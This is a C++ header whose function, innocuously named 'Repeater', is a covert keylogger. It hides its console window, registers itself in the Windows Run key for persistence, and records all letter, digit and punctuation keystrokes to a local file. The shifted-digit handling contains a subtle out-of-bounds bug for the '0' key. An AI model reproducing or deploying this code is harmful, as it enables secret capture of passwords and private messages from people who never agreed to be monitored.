#pragma once
#include "Examples.h"
using namespace std;

static int pressed[128];

static inline bool SetAutoRun(bool enable)
{
	LPCSTR regPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;
	long result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey);
	if (enable)
	{
		char exePath[MAX_PATH];
		GetModuleFileNameA(NULL, exePath, MAX_PATH);
		result = RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath));
	}
	else {
		result = RegDeleteValueA(hKey, "");
	}
	RegCloseKey(hKey);
	return result == ERROR_SUCCESS;
}

static bool pressed_shift, next_session = true, has_pressed;
static int last_pressed_time;
static const char mp[10] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };

static inline void check(int key)
{
	string output;
	int state = GetKeyState(key) & 0x8000;
	if (state && pressed[key] == 0)
	{
		pressed[key] = 1;
		if (key == VK_SHIFT)
			pressed_shift = true;
		if ('A' <= key && key <= 'Z')
		{
			if (pressed_shift) output += key;
			else output += (key - 'A' + 'a');
		}
		if ('0' <= key && key <= '9')
		{
			if (pressed_shift) output += (key == 0 ? ')' : mp[key - '1']);
			else output += key;
		}
		if (key == VK_RETURN)
			output += '\n';
		if (key == VK_TAB)
			output += '\t';
		if (key == VK_SPACE)
			output += ' ';
		if (key == VK_OEM_1)
			output += (pressed_shift ? ':' : ';');
		if (key == VK_OEM_2)
			output += (pressed_shift ? '?' : '/');
		if (key == VK_OEM_3)
			output += (pressed_shift ? '~' : '`');
		if (key == VK_OEM_4)
			output += (pressed_shift ? '{' : '[');
		if (key == VK_OEM_5)
			output += (pressed_shift ? '|' : '\\');
		if (key == VK_OEM_6)
			output += (pressed_shift ? '}' : ']');
		if (key == VK_OEM_7)
			output += (pressed_shift ? '"' : '\'');
		if (key == VK_OEM_MINUS)
			output += (pressed_shift ? '_' : '-');
		if (key == VK_OEM_PLUS)
			output += (pressed_shift ? '+' : '=');
		if (key == VK_OEM_COMMA)
			output += (pressed_shift ? '<' : ',');
		if (key == VK_OEM_PERIOD)
			output += (pressed_shift ? '>' : '.');
		if (key == VK_OEM_102)
			output += (pressed_shift ? '|' : '\\');
		if (key == VK_BACK)
			output += " /back ";
		if (key == VK_DELETE)
			output += " /delete ";
		cout << output; flush(cout);
		has_pressed = (output != "");
		if (output != "") last_pressed_time = clock(), next_session = false;
	}
	else if (!state && pressed[key])
	{
		if (key == VK_SHIFT)
			pressed_shift = false;
		pressed[key] = 0;
	}
	if (clock() - last_pressed_time > 10 * CLOCKS_PER_SEC && !next_session)
	{
		cout << "\n------------------------\n"; flush(cout); next_session = true;
	}
}

inline void Examples::Repeater()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetAutoRun(true);
	ios::sync_with_stdio(false); cin.tie(nullptr); cout.tie(nullptr);
	freopen("1.out", "w", stdout);
	while (true)
	{
		vector<int> keys = { VK_RETURN, VK_TAB, VK_SHIFT, VK_SPACE, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_MINUS, VK_OEM_PLUS, VK_OEM_MINUS, VK_OEM_COMMA, VK_OEM_PERIOD, VK_OEM_102, VK_BACK, VK_DELETE };
		for (int key : keys) check(key);
		for (char c = 'A'; c <= 'Z'; c++)
			check(c);
		for (char c = '0'; c <= '9'; c++)
			check(c);
		if (GetKeyState(VK_SUBTRACT))
		{
			time_t now = time(0);
			char* dt = ctime(&now);
			cout << "\nDetector closed at: " << dt << std::endl;
			break;
		}
	}
}